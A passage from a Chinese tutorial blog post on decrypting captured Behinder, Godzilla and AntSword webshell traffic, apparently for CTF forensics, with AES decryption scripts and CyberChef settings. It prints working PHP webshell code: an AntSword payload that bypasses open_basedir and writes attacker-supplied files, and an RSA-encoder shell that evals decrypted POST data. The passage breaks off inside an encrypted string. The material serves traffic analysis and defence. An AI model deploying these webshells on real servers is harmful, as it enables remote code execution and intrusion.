<p>该Shell通过OpenSSL扩展实现AES加解密，而OpenSSL中的AES128通常默认对应AES-128-CBC，而上文那句话里并没有传入IV参数，所以OpenSSL会把所需的IV处理为默认值，也就是全0（16个\x00）</p>
<p>如果在WebShell中传了自定义的IV参数，那么解密时需要将该IV填入，比如：<code>0123456789abcdef</code></p>
<p>照常理来说使用这样默认为16个<code>\x00</code>的IV即可正常解密。但传入16个1也可以正常解出<code>base64_decode()</code>括号内的内容，如下图所示：</p>
<p><img src="/imgs/f4413f003bad201ef52b84974e4a5bdb.png" srcset="/img/loading.gif" lazyload></p>
<p>这要说到AES-CBC的原理：</p>
<p><img src="/imgs/040733479f1ea54a0871282953df365a.png" srcset="/img/loading.gif" lazyload></p>
<p>每一个密文块（16位）解密后都要和前一个密文块按位异或，而第一个密文块前没有密文块，所以需要16位的IV来“充当密文块”，而IV的错误只会影响第一个密文块的内容，后面的密文块能否正常解密只和前一个密文块有关。<code>base64_decode()</code>括号内的内容并不在第一个密文块里，所以看上去变成了“无论什么IV都可以正确解出密文”</p>
<p>虽然偏移是0（异或0等于没有异或，也就等于没有IV），但依然不能直接使用AES-ECB进行解密，因为相比起ECB，IV是0的CBC从第二个密文块开始依然有异或的过程，所以在Cyberchef里应使用如下参数解密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">AES Decrypt <span class="hljs-comment">#仅讨论默认情况</span><br>Key: e45e329feb5d925b (UTF-<span class="hljs-number">8</span>)<br>IV： \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 (Hex)<br>Mode：CBC<br>Input / Output：Raw (视情况而定)<br></code></pre></td></tr></table></figure>

<p>反正不管是哪种加密，都可以用CyberChef试一试，看看哪一种可以正常解出来就行</p>
<p><img src="/imgs/N3.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/imgs/N4.png" srcset="/img/loading.gif" lazyload></p>
<p>当然，这里如果想要偷懒，对于冰蝎和哥斯拉流量也可以用<code>@风二西</code>师傅的<code>承影_哥斯拉冰蝎解码工具</code>辅助解密</p>
<p>直接将木马中的密钥复制到工具中，然后 Ctrl+A 全选加密的数据，再右键选择对应的解密方式即可</p>
<p><img src="/imgs/N5.png" srcset="/img/loading.gif" lazyload></p>
<p>最后，如果遇到数据量比较庞大的流量分析的时候，可能会需要用到脚本解密批量的情况</p>
<p>这里我就放几个比较简单的解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># XOR</span><br><span class="hljs-keyword">import</span> base64<br>key = <span class="hljs-string">&quot;e45e329feb5d925b&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_xor</span>(<span class="hljs-params">ciphertext_base64</span>):<br>    ciphertext = base64.b64decode(ciphertext_base64)<br>    key_stream = (key[(i+<span class="hljs-number">1</span>)%<span class="hljs-built_in">len</span>(key)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ciphertext)))<br>    decrypted = <span class="hljs-built_in">bytes</span>([a ^ <span class="hljs-built_in">ord</span>(b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(ciphertext, key_stream)])<br>    <span class="hljs-keyword">return</span> decrypted<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># AES-CBC</span><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">import</span> base64<br><br>key = <span class="hljs-string">&quot;5b4582c9d56b5b33&quot;</span><br>key = key.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).ljust(<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)  <span class="hljs-comment"># 默认填充到16字节(AES-128)</span><br>iv = <span class="hljs-string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_aes_cbc</span>(<span class="hljs-params">ciphertext_base64</span>):<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    ciphertext = base64.b64decode(ciphertext_base64)<br>    decrypted = cipher.decrypt(ciphertext)<br>    <span class="hljs-keyword">return</span> decrypted<br></code></pre></td></tr></table></figure>

<h3 id="蚁剑流量分析"><a href="#蚁剑流量分析" class="headerlink" title="蚁剑流量分析"></a>蚁剑流量分析</h3><p>蚁剑支持多种编码器，然后Github上也有很多<a target="_blank" rel="noopener" href="https://goodlunatic.github.io/posts/5422d65/#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">开源的编码器</a></p>
<p>1、 <a target="_blank" rel="noopener" href="https://github.com/lowliness9/AntSwordEncoder">https://github.com/lowliness9/AntSwordEncoder</a></p>
<p>2、 <a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AwesomeEncoder">https://github.com/AntSwordProject/AwesomeEncoder</a></p>
<p>因此流量的分析和解密上就会稍微复杂一点</p>
<p>这里我稍微写一下蚁剑流量分析需要注意的地方：</p>
<blockquote>
<p>0、首先需要判断出攻击者用的是什么编码器</p>
<p>1、路径base64字符串需要去除前两个字符后再解码</p>
<p>2、响应数据的头尾有额外的字符，需要先去除然后再base64解码</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 蚁剑webshell一个比较简单的例子</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 设置一些PHP配置</span><br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>); <span class="hljs-comment">// 关闭显示错误信息</span><br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置脚本执行时间为无限制</span><br><span class="hljs-comment">// 获取open_basedir配置</span><br><span class="hljs-variable">$opdir</span> = @<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>);<br><span class="hljs-comment">// 如果open_basedir配置存在</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$opdir</span>) &#123;<br>    <span class="hljs-comment">// 获取当前脚本所在目录</span><br>    <span class="hljs-variable">$ocwd</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_FILENAME&quot;</span>]);<br>    <span class="hljs-comment">// 将open_basedir路径分割成数组</span><br>    <span class="hljs-comment">// /;|:/</span><br>    <span class="hljs-variable">$oparr</span> = <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&quot;Lzt8Oi8=&quot;</span>), <span class="hljs-variable">$opdir</span>);<br>    <span class="hljs-comment">// 将当前目录和系统临时目录添加到数组中</span><br>    @<span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$oparr</span>, <span class="hljs-variable">$ocwd</span>, <span class="hljs-title function_ invoke__">sys_get_temp_dir</span>());<br>    <span class="hljs-comment">// 遍历open_basedir数组</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$oparr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;<br>        <span class="hljs-comment">// 如果目录不可写，继续下一个目录</span><br>        <span class="hljs-keyword">if</span> (!@<span class="hljs-title function_ invoke__">is_writable</span>(<span class="hljs-variable">$item</span>)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">// 创建一个临时目录</span><br>        <span class="hljs-variable">$tmdir</span> = <span class="hljs-variable">$item</span> . <span class="hljs-string">&quot;/.573ef8c9dd12&quot;</span>;<br>        @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$tmdir</span>);<br>        <span class="hljs-comment">// 如果目录创建失败，继续下一个目录</span><br>        <span class="hljs-keyword">if</span> (!@<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$tmdir</span>)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">// 获取临时目录的真实路径</span><br>        <span class="hljs-variable">$tmdir</span> = <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$tmdir</span>);<br>        <span class="hljs-comment">// 切换到临时目录</span><br>        @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$tmdir</span>);<br>        <span class="hljs-comment">// 修改open_basedir配置，使其可以访问上层目录</span><br>        @<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>, <span class="hljs-string">&quot;..&quot;</span>);<br>        <span class="hljs-comment">// 获取目录路径的数组</span><br>        <span class="hljs-variable">$cntarr</span> = @<span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&quot;/\\\\|\//&quot;</span>, <span class="hljs-variable">$tmdir</span>);<br>        <span class="hljs-comment">// 逐级返回上层目录，以还原open_basedir配置</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$cntarr</span>); <span class="hljs-variable">$i</span>++) &#123;<br>            @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 恢复open_basedir配置为根目录</span><br>        @<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-comment">// 删除临时目录</span><br>        @<span class="hljs-title function_ invoke__">rmdir</span>(<span class="hljs-variable">$tmdir</span>);<br>        <span class="hljs-comment">// 跳出循环，只操作第一个可写目录</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 自定义函数，对输出进行base64编码</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asenc</span>(<span class="hljs-params"><span class="hljs-variable">$out</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> @<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$out</span>);<br>&#125;<br><span class="hljs-comment">// 自定义函数，获取输出缓冲区内容并进行处理</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asoutput</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>(); <span class="hljs-comment">// 获取输出缓冲区内容</span><br>    <span class="hljs-title function_ invoke__">ob_end_clean</span>(); <span class="hljs-comment">// 清空输出缓冲区</span><br>    <span class="hljs-comment">// 输出一些标识字符串以及经过base64编码的缓冲区内容，响应内容前后有额外字符的原因所在</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fb708664&quot;</span>;<br>    <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">asenc</span>(<span class="hljs-variable">$output</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;870b983ed5&quot;</span>;<br>&#125;<br><span class="hljs-comment">// 开始输出缓冲区</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// 解码POST请求中的文件路径和内容</span><br>    <span class="hljs-comment">// 从这个变量的值中取出从第二个字符开始到最后的子字符串，蚁剑需要去除前两个字母的原因所在</span><br>    <span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;idb82191cedb24&quot;</span>], <span class="hljs-number">2</span>));<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;e748c4dcd196bb&quot;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$c</span>);<br>    <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$c</span>);<br>    <span class="hljs-variable">$buf</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">// 将内容进行URL解码</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$c</span>); <span class="hljs-variable">$i</span> += <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-variable">$buf</span> .= <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%&quot;</span> . <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$c</span>, <span class="hljs-variable">$i</span>, <span class="hljs-number">2</span>));<br>    &#125;<br>    <span class="hljs-comment">// 将解码后的内容写入文件，并返回结果</span><br>    <span class="hljs-keyword">echo</span> (@<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&quot;a&quot;</span>), <span class="hljs-variable">$buf</span>) ? <span class="hljs-string">&quot;1&quot;</span> : <span class="hljs-string">&quot;0&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-comment">// 如果发生异常，输出错误信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR://&quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>&#125;<br><span class="hljs-comment">// 调用自定义函数处理输出</span><br><span class="hljs-title function_ invoke__">asoutput</span>();<br><span class="hljs-comment">// 终止脚本执行</span><br><span class="hljs-keyword">die</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h4><h4 id="ROT13"><a href="#ROT13" class="headerlink" title="ROT13"></a>ROT13</h4><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ant&#x27;</span>];<br><span class="hljs-variable">$pk</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">-----BEGIN PUBLIC KEY-----</span><br><span class="hljs-string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfhiyoPdM6svJZ+QlYywklwVcx</span><br><span class="hljs-string">PkExXQDSdke4BVYMX8Hfohbssy4G7Cc3HwLvzZVDaeyTDaw+l8qILYezVtxmUePQ</span><br><span class="hljs-string">5qKi7yN6zGVMUpQsV6kFs0GQVkrJWWcNh7nF6uJxuV+re4j+t2tKF3NhnyOtbd1J</span><br><span class="hljs-string">RAcfJSQCvaw6O8uq3wIDAQAB</span><br><span class="hljs-string">-----END PUBLIC KEY-----</span><br><span class="hljs-string">EOF</span>;<br><span class="hljs-variable">$cmds</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$pk</span> = <span class="hljs-title function_ invoke__">openssl_pkey_get_public</span>(<span class="hljs-variable">$pk</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cmds</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">openssl_public_decrypt</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$value</span>), <span class="hljs-variable">$de</span>, <span class="hljs-variable">$pk</span>)) &#123;<br>    <span class="hljs-variable">$cmd</span> .= <span class="hljs-variable">$de</span>;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">openssl_public_decrypt</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>), <span class="hljs-variable">$de</span>, <span class="hljs-variable">$pk</span>)) &#123;<br>       <span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$k</span>]=<span class="hljs-variable">$de</span>;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br></code></pre></td></tr></table></figure>

<p>可以直接用CTF-NetA一把梭</p>
<p><img src="/imgs/image-20250515121850746.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/imgs/image-20250515121856215.png" srcset="/img/loading.gif" lazyload></p>
<p>当然，我们也可以自己写个 PHP 脚本导入公钥解密</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 常规蚁剑的马</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;GmFJzJHcsMOZxeGvb3Ulf4Y8e5RRhttAV1bsfypbvQAJW8IRFcqDVoXtyiclZwz2qXdQN8ivFYNqNxhkwtjbB7OitVLgULBfWlOnwtufxvmbmO4u8WlINbPbf/DbAy0Qx3GjBMFpFzrCkKINOfWQ5JqSD1EPx6sM9Cu1VkX5nus=|nL6Ds9dWn+UW5Jb0JAhoTb4rqPJJKbgcPNJfXLP1AKPbWHVE0JFSjClsnXWmFPXfeqPdKqcYxb/14hEwFzs51N5f6+NowrGHjYT+ObPKXpYxzg0vkCMihUMA7DI2YPUWEyPdvoIFg/bW5S3MommwKN9epOto55dtq6Pnb8NEHzY=|S4ic8EaKa3zEkRd7qsTGDs7uf3qiU1UVZE4fheQz3iq1HkiY6rIvAdtvcmsBF5aJWjdA/U2py1Mz105F2Tzm4dDX2Ag/rhX4ysiP8NJDEp+I55R0dfJu6szTOr3O2OTaUQK7iSYT4PKHjdo+rgeHK3hWzzMFAs6i2R9E81vz9WE=|FNCwxF7bDPNgizk4oa7bq4xbIObNCZNYNBdrTLMbYegWZ6FVYi54TLuABR/nkDLXq38cT099hjajM4iY+VL4g8tBRP++4LyPcSyzyC6mDtshAlmQtFteq4sGb+3IilDPekURxQ5RodRGBPtHr+nCNICbgmbqNaYKcVJRfMoK3q8=|m+nGWL1bOFJzaYeT54FtW12U3dWPZk5PJa91+YTtLn9Wg1c8JEf0FzI+YlBtpp6pW0fT7FfbTiJhQsv3f97bb3d+Cs7A5dM/ZG5YXDoDHGhRJKw0+TTHRIm3PH4fnbQNI8zhi5+9t2+0ueujAuXkk8i73A4lH36uKJFloL6yqs8=|YsyuPkbRlpDWwjhlkTThQN9GQXGkkzyNSFoxs5IfsRbbO7ZHphlFhL4yYsRYAgp8MkMJ64x7NfIGoVgDJnA1YgORiJOf8GP/p/28MLOuscy1SVN/lLnJzbhmf/7vfg0/Q94QAEWk2TOgSil0h3JDsgQYqDtFFldHWDnqEvYlWZI=|C2ZaL3MQWCQBmNcq8xAxxlhvXzUxo0qBz2PUIqBIMcKNJ3sgxU+RTqSwYoqPTDAg3//7rNa+dkinRAidD8GjrcSBd5qdbTLQlWZGME9Lv6JEFt0udTU0FVrhV/ctPz+z1NN5P4pN1tj35sNKsyfYH1kq13A+3dYk0wZlMU9KIFI=|l65yWzb3A97Cdu0wdn59Hiag/Um4/LZTrolCjwo9d7/J3Z9stTkaEtLe2XBdVQZsipUfnW2o7JWgQNo0TUbGWIv2H5wKGaTfPm7OTSkm+ao48Nn1d/+yME+RLudQqbmYREMAJFviNJST+H4Q+MqyngjMeGrb5jmlw0eQZ/MUx5Q=|EYwu5Y3rgl8k2KrPZjnGPWjriLI1mDeJwA4KhjvJ4wQs9Xx+ITDsxBr0eMfL/Km95ykbfMlZcrSzonx5hLiE2YLwDjX/cIIZxqzZXkEYq00AdAPrFnhFVdvJn/SHQ1LdGHgAN88Y2EOZOPM8ZXima61BxCY44TlrezIbBj4+eQ0=|Z2/dEUju0jw63PMHCK9CAG+tHmwiH0t3GraGPCes4TZT5hIfv6kHMTOgMthTK6sd5qy+EVw6d1Qxh03WMHVH0gR2aYqEl1RdYwQpN0NPsSM+fETsag3nQ4oV3VniGlaMmdFIiYatNvKNl7tOcapklyxEEIA0Jc33O7FDjUXKiHU=|YEVG5OctKJXP1Z7kywDJGrmb7BvXW/C3iQudtTCLgUIbMhXFq90wLvW7No7ZoqhY/Mh1XlJKtkBZJWEbsORW23hxvA5LCb/edsfJmIxWtj5cRG9g66j3BiEUPDjvtYi6beUjUtKmuSInELTkmIKf1jo5qyZE+VcWC4HfAT0wbFw=|ii/O42J/+ko4xPNfNuunKR7gyji/wtaiMcKMzQM2Qg7KZE/+xAcLX3Znh55OwgsfaTX6AedF+L/1hwMp9zigbvXorSE0TNay//nVlcnhhC4snAu2/hjXNoI3OnnWlfFFLYOj5v+1LN1nCU/UzoHV6/w1/4bVz7Maovj14BfXklI=|eay1qqOy5QmJmStB9EH4JKPms1In5agVigegn5/1IZS+0QpBgK37mWg02rspbMz20brtSgsv2PhJ3gMTFg3ib7z0cQZPvcNV6DTZwSHbUO2M1uQetssYMMnBPPulwLhTkND4SzwSsgDLS6m8TxbHL0qpZRcnNo2sMy478S5DkvM=|e4qLRtta2W6ItXy3HNgpYuQuSSzpsvq+SUfoRKWM8Z5QdiBeleS/YDGP0VZqRJh3CPMC6vbegwB7qNLAt6czTsHQTdTAJBLr5g4oTDc9Sxlk8A7vvK0ljLSgKjNw5s3BDa03jINPkc5BbDkrTaXMq01Bqcu5DPTTA0pO/Z9oq1Q=|RBdZrEGknOK+PCuQ1F2eTxKvAi50XD/Z1ccAItPJ+48VlSbOTZa/wkdr82K8LE56z0E4JtZDBVSj9I4TurU2bbmfCjKXGw9xlagS7YMr/hfyCy/2hrVveAkaBZDAtmnrM4nGpFxVpzArl124XlqEzh9cSS9LAnwkNm8j05D6mDc=|aZpV5K4m1Rwxd/Y9eOfJ0bRpIZybj2tSjuAEJI7Il/EV9ZC0pXLIkgWviG40pXQFGoEwGex7f0j/Je4ldLRKnrpsyZ+/3mZtHnHL4gepf+iVaULQ8jdHTVVnM1t4qLJk+RnhYbuFjcUy5Yo6rn0Cju8sPIdpEwvi8fvetIOGVJE=|fPGROe6VaAwzqmNuk86fnWT4LqandXTwuewTC80zI8xTFSj1S6YMxPROTHS94gXlCcLTfFjEW2VpH2tyANX1FBIw5sSjsuS6CQKuqiQo6ID975H5Ox+KkJs6XLP/l5Or34U3rryHzBooTrXQlDl21qoPBLdj5URgGrEq7wrvLVA=|jp3lUm3Gz2eZpB5zghEGom2syK8nBymkc6h3pKE/mIS8KW6gD2OFSEneFERI0jy26kVOBhxr3ZHY3WoL6s5aJepTuY7D6Dpz/REI+FzR2PlCo0WvyLQdOphMgbYef1SyYr1+DWK/JxxFjxtfVRZlwL7+OyHQjQ05oVHyq6juSEI=|h8tsCCKgjChZ5U/sZxeVPiF8hO+cB6qqfeWnTAMydEcLmR0iwvHcarZw4g2WH2ASvwIN0av4GzLSu2QtOM1u0y/OuVX3v9/Vp+nNMZ/Dog0NUxFIPD1HTgaK3w7DdnA6B6i26JooWAxKlTFgYmr0x7K53pmM6B8wVQu/ADsbFBE=|CdejrTSVZhSgL+3bhPQyuL7ho71i+L8VvpwNg+D84YnKdwbbbfgqIMu+gefCBmyzvhbhEeGR16/T/fZ4bkneak+fzZpgUrejrFbOETG2Rg9zViznPwBdku9FTlWUybaRD0CHKeY7nE93/G2yXWSpuk/7P594cAPi1qd2WnEbaBc=|Hnxjy7ZSfmn6B59Kv7VXu1mhtYdgGbOtsLsLqDX6K1dKhtHsGx0guy03qwqRA0XElDdJ3Dvgqi5lgb8SY6MiDf1c9u870K8S9xVTn6Y0lbZgtvPoDrobEiT6tGEQCRsUuXB6jbUTgnNPmaDAuidQZqdsSBIGZwQyzycgxHmaDuE=|Imz1om4RRCU1Wnyowe5SYFtICyD1BODveyZ497yURKcyMgoogUxi0cPCiyexdD9ciNYk6DGyimegT7zMeIA5oGfNg2EHbzuBJeSc4wqLCJtSmTe66inu3dqC4IDxt2ghkgFLSQZWqNOKOgUt1b5wgy3O/Y3iIzS888TuFSDm+RQ=|jldlrb8EHvWiKi5E/HBIrn4UUnzMZO8+6ugZ7hjZTtWI5Vg9EeWdmITpEpOQIWIXpOUhaI+VydVcom8e7Fe6gR6u4RPy5ChmFgjZhT03gwwNXzJeiaE6x7ZZjXGBZA3Lwu5gRns3s+hTM0Tm2